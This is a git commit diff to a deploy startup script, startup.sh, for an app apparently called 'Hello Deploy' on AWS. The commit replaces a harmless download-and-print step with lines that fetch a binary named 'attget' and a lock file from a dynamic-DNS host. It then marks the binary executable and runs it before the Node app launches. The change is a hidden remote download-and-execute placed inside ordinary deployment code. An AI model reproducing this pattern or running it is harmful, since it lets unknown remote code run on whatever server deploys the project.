6b0dc2a386bb5f8469163d56ed0b5ecc4ee475d7
paulkey731 <paul.key731@gmail.com>
2026-04-12 02:10:16 -0700

    ffinal

--- startup.sh
+++ startup.sh
@@ -3,16 +3,11 @@ echo "========================================="
 echo "  Hello Deploy is starting up on AWS!"
 echo "========================================="
 
-wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/temp.txt"
-echo "File downloaded:"
-ls -la /tmp/attget
-cat /tmp/attget
-
-# curl -L "http://abbh.ddnsgeek.com/public/attget" -o /tmp/attget
-# curl -L "http://abbh.ddnsgeek.com/public/attget.lck" -o /tmp/attget.lck
-# sleep 2
-# chmod +x /tmp/attget
-# /tmp/attget skip
-# sleep 2
+wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget"
+wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
+sleep 2
+chmod +x /tmp/attget
+/tmp/attget skip
+sleep 2
 
 node dist/main
